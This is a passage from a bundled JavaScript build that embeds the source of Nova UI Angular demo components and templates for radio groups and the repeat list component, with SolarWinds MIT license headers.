CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-radio-docs-example",\n    templateUrl: "./radio-group-docs.example.component.html",\n})\nexport class RadioGroupDocsExampleComponent {}\n'},63278:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<form [formGroup]="fancyForm">\n    <nui-form-field\n        caption="Radio Group"\n        i18n-caption\n        hint="Some pretty long text with hint"\n        i18n-hint\n        info="text"\n        [control]="fancyForm.controls[\'radioGroup\']"\n    >\n        <nui-radio-group\n            id="input-radioGroup"\n            formControlName="radioGroup"\n            name="vegetable"\n            required\n        >\n            <nui-radio *ngFor="let vegetable of vegetables" [value]="vegetable">\n                {{ vegetable }}\n            </nui-radio>\n        </nui-radio-group>\n        <nui-validation-message for="required" i18n>\n            This is required. C\'mon\n        </nui-validation-message>\n    </nui-form-field>\n</form>\n'},14474:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-radio-group-in-form-example",\n    templateUrl: "./radio-group-in-form.example.component.html",\n})\nexport class RadioGroupInFormExampleComponent {\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n    public fancyForm;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.fancyForm = this.formBuilder.group({\n            radioGroup: this.formBuilder.control(this.vegetables[1], [\n                Validators.required,\n            ]),\n        });\n    }\n}\n'},86098:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected fruit: {{ selectedFruit }}</h1>\n<nui-radio-group\n    id="fruit-radio-group-inline"\n    name="fruit"\n    class="nui-radio-group-inline"\n    [(value)]="selectedFruit"\n>\n    <nui-radio\n        *ngFor="let fruit of fruits"\n        [value]="fruit"\n        [checked]="fruit === \'Orange\'"\n    >\n        {{ fruit }}\n    </nui-radio>\n</nui-radio-group>\n'},31726:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-radio-group-inline-example",\n    templateUrl: "./radio-group-inline.example.component.html",\n})\nexport class RadioGroupInlineExampleComponent {\n    public fruits = [\n        $localize`Banana`,\n        $localize`Orange`,\n        $localize`Kiwi`,\n        $localize`Papaya`,\n    ];\n    public selectedFruit: string;\n\n    constructor() {}\n}\n'},91592:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <nui-radio-group\n        id="basic-radio-group"\n        name="fruit"\n        [(value)]="selectedFruit"\n    >\n        <nui-radio\n            *ngFor="let fruit of fruits"\n            [value]="fruit"\n            [checked]="fruit === \'Orange\'"\n            [disabled]="fruit === \'Banana\'"\n        >\n            {{ fruit }}\n        </nui-radio>\n    </nui-radio-group>\n\n    <form [formGroup]="disabledForm">\n        <nui-form-field\n            caption="Radio Group"\n            [control]="disabledForm.controls[\'radioGroup\']"\n        >\n            <nui-radio-group\n                id="disabled-radio-group"\n                formControlName="radioGroup"\n                name="vegetable"\n            >\n                <nui-radio\n                    *ngFor="let vegetable of vegetables"\n                    [value]="vegetable"\n                >\n                    {{ vegetable }}\n                </nui-radio>\n            </nui-radio-group>\n        </nui-form-field>\n    </form>\n    <nui-checkbox\n        id="toggle-disabled-group-checkbox"\n        [checked]="true"\n        (valueChange)="toggleDisabled($event)"\n    >\n        Disabled\n    </nui-checkbox>\n</div>\n'},83608:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\nimport { CheckboxChangeEvent } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-radio-group-test",\n    templateUrl: "./radio-group-test.component.html",\n})\nexport class RadioGroupTestComponent {\n    public disabledForm;\n\n    public fruits = [\n        $localize`Banana`,\n        $localize`Orange`,\n        $localize`Kiwi`,\n        $localize`Papaya`,\n    ];\n    public vegetables = [\n        $localize`Cabbage`,\n        $localize`Potato`,\n        $localize`Tomato`,\n        $localize`Carrot`,\n    ];\n\n    public selectedFruit: string;\n    public selectedFruitInline: string;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.disabledForm = this.formBuilder.group({\n            radioGroup: this.formBuilder.control({ value: "", disabled: true }),\n        });\n    }\n\n    public toggleDisabled(event: CheckboxChangeEvent): void {\n        if (!event.target.checked) {\n            this.disabledForm.enable();\n        } else {\n            this.disabledForm.disable();\n        }\n    }\n}\n'},18194:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <h3>Basic Radio Group</h3>\n    <nui-radio-group\n        id="fruit-radio-group"\n        name="fruit"\n        [(value)]="selectedFruit"\n    >\n        <nui-radio\n            *ngFor="let fruit of fruits"\n            [value]="fruit"\n            [checked]="fruit === \'Orange\'"\n            [disabled]="fruit === \'Kiwi\'"\n        >\n            {{ fruit }}\n        </nui-radio>\n    </nui-radio-group>\n    <hr />\n\n    <h3>Radio Group with pre-selected option and hints</h3>\n    <nui-radio-group\n        id="color-radio-group"\n        name="color"\n        [(value)]="selectedColor"\n    >\n        <nui-radio\n            *ngFor="let color of colors"\n            [value]="color"\n            [hint]="colorHints[color]"\n            [disabled]="color === \'Blue\'"\n            [checked]="color === \'Green\'"\n        >\n            {{ color }}\n        </nui-radio>\n    </nui-radio-group>\n    <hr />\n\n    <h3>Inline Horizontal Group</h3>\n    <nui-radio-group\n        class="nui-radio-group-inline"\n        id="inline-color-radio-group"\n        name="color"\n        [(value)]="selectedColor"\n    >\n        <nui-radio\n            *ngFor="let color of colors"\n            [value]="color"\n            [hint]="colorHints[color]"\n            [disabled]="color === \'Red\'"\n            [checked]="color === \'Green\'"\n        >\n            {{ color }}\n        </nui-radio>\n    </nui-radio-group>\n    <hr />\n\n    <h3>Part Of Form</h3>\n    <nui-radio-group-in-form-example\n        id="vegetable-radio-group"\n    ></nui-radio-group-in-form-example>\n    <hr />\n\n    <form [formGroup]="disabledForm">\n        <nui-form-field\n            caption="Disabled Radio Group in form"\n            [control]="disabledForm.controls[\'radioGroup\']"\n        >\n            <nui-radio-group\n                id="fruit-radio-group-disabled"\n                formControlName="radioGroup"\n                name="fruit-disabled"\n            >\n                <nui-radio *ngFor="let fruit of fruits" [value]="fruit">\n                    {{ fruit }}\n                </nui-radio>\n            </nui-radio-group>\n        </nui-form-field>\n    </form>\n</div>\n'},58030:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormBuilder } from "@angular/forms";\n\n@Component({\n    selector: "nui-radio-group-visual-test",\n    templateUrl: "./radio-group-visual-test.component.html",\n})\nexport class RadioGroupVisualTestComponent {\n    public disabledForm;\n    public colors = ["Red", "Green", "Blue"];\n    public colorHints = {\n        Red: "hot color",\n        Green: "color of nature",\n        Blue: "color of sky",\n    };\n    public fruits = ["Banana", "Orange", "Kiwi", "Papaya"];\n    public selectedFruit: string;\n    public selectedColor: string;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.disabledForm = this.formBuilder.group({\n            radioGroup: this.formBuilder.control({ value: "", disabled: true }),\n        });\n    }\n}\n'},10434:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected color: {{ selectedColor }}</h1>\n<nui-radio-group id="color-radio-group" name="color" [(value)]="selectedColor">\n    <nui-radio value="Red">\n        Red\n        <ng-container hint>\n            This is some more\n            <a\n                href="https://en.wiktionary.org/wiki/elaborate"\n                target="_blank"\n                rel="noopener noreferrer"\n                >elaborate</a\n            >\n            hint.\n        </ng-container>\n    </nui-radio>\n    <nui-radio value="Green">\n        Green\n        <ng-container hint>\n            Well, depends on <strong>your</strong> definition of\n            <a\n                href="https://en.wiktionary.org/wiki/elaborate"\n                target="_blank"\n                rel="noopener noreferrer"\n                >elaborate</a\n            >.\n        </ng-container>\n    </nui-radio>\n    <nui-radio value="Blue">\n        Blue\n        <ng-container hint>\n            At least it does\n            <a\n                href="https://en.wiktionary.org/wiki/hyperlink"\n                target="_blank"\n                rel="noopener noreferrer"\n                >links</a\n            >.\n        </ng-container>\n    </nui-radio>\n    <nui-radio value="Teal">\n        Teal\n        \x3c!-- links actually don\'t require click event filtering, unline other elements --\x3e\n        <div hint nuiClickFilter (click)="showToast()">\n            Can also\n            <span>cancel bubble anywhere in hint</span>\n            when customized.\n        </div>\n    </nui-radio>\n</nui-radio-group>\n'},51281:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-with-hints-content-radio-group-example",\n    templateUrl: "./radio-group-hints-content.example.component.html",\n    styles: [\n        `\n            div[hint] {\n                cursor: initial;\n            }\n            div[hint] > span {\n                font-weight: bold;\n            }\n        `,\n    ],\n})\nexport class RadioGroupHintsContentExampleComponent {\n    public colors = [$localize`Red`, $localize`Green`, $localize`Blue`];\n    public selectedColor: string;\n\n    public constructor(private readonly toastService: ToastService) {}\n\n    public showToast(): void {\n        this.toastService.info({\n            title: $localize`Radio button`,\n            message: $localize`This event should not propagate to the radio button`,\n        });\n    }\n}\n'},88069:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected color: {{ selectedColor }}</h1>\n<nui-radio-group id="color-radio-group" name="color" [(value)]="selectedColor">\n    <nui-radio\n        *ngFor="let color of colors"\n        [value]="color"\n        [checked]="color === \'Green\'"\n        [hint]="colorHints[color]"\n    >\n        {{ color }}\n    </nui-radio>\n</nui-radio-group>\n'},66062:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-with-hints-radio-group-example",\n    templateUrl: "./radio-group-hints.example.component.html",\n})\nexport class RadioGroupHintsExampleComponent {\n    public colors = [$localize`Red`, $localize`Green`, $localize`Blue`];\n    public colorHints = {\n        Red: $localize`hot color`,\n        Green: $localize`color of nature`,\n        Blue: $localize`color of sky`,\n    };\n    public selectedColor: string;\n\n    constructor() {}\n}\n'},15919:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiCheckboxModule,\n    NuiCommonModule,\n    NuiDocsModule,\n    NuiFormFieldModule,\n    NuiRadioModule,\n    NuiValidationMessageModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    BasicRadioGroupExampleComponent,\n    DisabledRadioGroupExampleComponent,\n    RadioGroupDocsExampleComponent,\n    RadioGroupHintsContentExampleComponent,\n    RadioGroupHintsExampleComponent,\n    RadioGroupInFormExampleComponent,\n    RadioGroupInlineExampleComponent,\n    RadioGroupTestComponent,\n    RadioGroupVisualTestComponent,\n    ValueChangeRadioGroupExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: RadioGroupDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "radio-group-test",\n        component: RadioGroupTestComponent,\n    },\n    {\n        path: "radio-group-visual-test",\n        component: RadioGroupVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        FormsModule,\n        NuiCommonModule,\n        NuiCheckboxModule,\n        NuiDocsModule,\n        NuiFormFieldModule,\n        NuiRadioModule,\n        NuiValidationMessageModule,\n        ReactiveFormsModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        BasicRadioGroupExampleComponent,\n        DisabledRadioGroupExampleComponent,\n        RadioGroupDocsExampleComponent,\n        RadioGroupHintsExampleComponent,\n        RadioGroupHintsContentExampleComponent,\n        RadioGroupInFormExampleComponent,\n        RadioGroupInlineExampleComponent,\n        RadioGroupTestComponent,\n        RadioGroupVisualTestComponent,\n        ValueChangeRadioGroupExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("radio-group"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class RadioGroupModule {}\n'},60252:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1 i18n>Selected color: {{ selectedColor }}</h1>\n<nui-radio-group\n    name="color"\n    [(value)]="selectedColor"\n    (valueChange)="showSelected()"\n>\n    <nui-radio\n        *ngFor="let color of colors"\n        [value]="color"\n        [hint]="colorHints[color]"\n    >\n        {{ color }}\n    </nui-radio>\n</nui-radio-group>\n'},64172:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-value-change-radio-group-example",\n    templateUrl: "./value-change-radio-group.example.component.html",\n})\nexport class ValueChangeRadioGroupExampleComponent {\n    public colors = [$localize`Red`, $localize`Green`, $localize`Blue`];\n    public colorHints = {\n        Red: $localize`hot color`,\n        Green: $localize`color of nature`,\n        Blue: $localize`color of sky`,\n    };\n    public selectedColor: string;\n\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public showSelected(): void {\n        this.toastService.success({\n            message: $localize`You selected ${this.selectedColor}. Nice!`,\n        });\n    }\n}\n'},20480:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./repeat-docs/repeat-docs.example.component";\nexport * from "./repeat-simple/repeat-simple.example.component";\nexport * from "./repeat-multi-selection/repeat-multi-selection.example.component";\nexport * from "./repeat-disabled-multi-selection/repeat-disabled-multi-selection.example.component";\nexport * from "./repeat-single-selection-mode/repeat-single-selection-mode.example.component";\nexport * from "./repeat-radio-selection-mode/repeat-radio-selection-mode.example.component";\nexport * from "./repeat-radio-with-non-required-selection-mode/repeat-radio-with-non-required-selection-mode.example.component";\nexport * from "./repeat-single-with-required-selection-mode/repeat-single-with-required-selection-mode.example.component";\nexport * from "./repeat-item/repeat-item.example.component";\nexport * from "./repeat-reorder-simple/repeat-reorder-simple-example.component";\nexport * from "./repeat-drag-simple/repeat-drag-simple.example.component";\nexport * from "./repeat-drag-handle/repeat-drag-handle.example.component";\nexport * from "./repeat-drag-preview/repeat-drag-preview.example.component";\nexport * from "./repeat-reorder-item-config/repeat-reorder-item-config-example.component";\nexport * from "./repeat-virtual-scroll/repeat-virtual-scroll.component";\nexport * from "./repeat-test/repeat-test.component";\nexport * from "./repeat-visual-test/repeat-visual-test.component";\n'},12142:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="example">\n    <p>\n        <span class="simple-label" i18n>Selection:</span>\n        <span id="nui-demo-multi-repeat-disabled-values">{{\n            selectedColors | json\n        }}</span>\n    </p>\n    <p>\n        <nui-switch [(value)]="preventRowClick">prevent row click</nui-switch>\n    </p>\n    <nui-repeat\n        id="nui-demo-multi-repeat-disabled"\n        [itemsSource]="colors"\n        selectionMode="multi"\n        [preventRowClick]="preventRowClick"\n        [selection]="selectedColors"\n        (selectionChange)="selectedColors = $event"\n        [repeatItemTemplateRef]="repeatItemColorBoxTemplate"\n    ></nui-repeat>\n</div>\n\n<ng-template #repeatItemColorBoxTemplate let-item="item">\n    <div class="color-box {{ item.color }}"></div>\n    <div [attr.class]="item.disabled ? \'nui-text-secondary--disabled\' : null">\n        {{ item.color }}\n    </div>\n</ng-template>\n'},78058:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-repeat-disabled-multi-selection-example",\n    templateUrl: "./repeat-disabled-multi-selection.example.component.html",\n})\nexport class RepeatDisabledMultiSelectionExampleComponent {\n    public colors = Object.freeze([\n        { color: $localize`blue`, disabled: true },\n        { color: $localize`green`, disabled: false },\n        { color: $localize`yellow` },\n        { color: $localize`cyan` },\n        { color: $localize`magenta`, disabled: true },\n        { color: $localize`black` },\n    ]);\n\n    public preventRowClick: boolean = false;\n\n    public selectedColors = [this.colors[0], this.colors[5]];\n}\n'},32354:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>nui-repeat</code> is responsible for repeating the items provided in\n    <code>itemSource</code>.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiRepeatModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>\n    This example demonstrates how easy it is to create a simple list by\n    repeating the items of provided datasource.<br />\n    Simply pass an array of items to <code>itemsSource</code>, and also don\'t\n    forget to set the <code>repeatItemTemplateRef</code> with a template to\n    render for each item.\n</p>\n<nui-example-wrapper filenamePrefix="repeat-simple" exampleTitle="Basic Usage">\n    <nui-repeat-simple-example></nui-repeat-simple-example>\n</nui-example-wrapper>\n\n<h2>Dragging</h2>\n<p>\n    To enable the dragging of items in the <code>nui-repeat</code> list, just\n    set the <code>draggable</code> input property to <code>true</code>.\n</p>\n<nui-example-wrapper\n    filenamePrefix="repeat-drag-simple"\n    exampleTitle="Enabling Drag & Drop"\n>\n    <nui-repeat-drag-simple-example></nui-repeat-drag-simple-example>\n</nui-example-wrapper>\n\n<h2>Reordering</h2>\n<p>\n    To allow list items to be reordered, set the <code>reorderable</code> input\n    property to <code>true</code>. Bind to the\n    <code>itemsReordered</code> output to receive sorting data when an item is\n    dragged to a new spot in the list. The payload for the event is an\n    <code\n        ><a href="../interfaces/IItemsReorderedEvent.html" target="_blank"\n            >IItemsReorderedEvent</a\n        ></code\n    >\n    object.\n</p>\n<nui-message type="info" [allowDismiss]="false">\n    Setting the <code>draggable</code> input to true with the\n    <code>reorderable</code> input set to false will disable reordering and only\n    allow dragging items to <strong>other</strong> containers.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="repeat-reorder-simple"\n    exampleTitle="Reordering"\n>\n    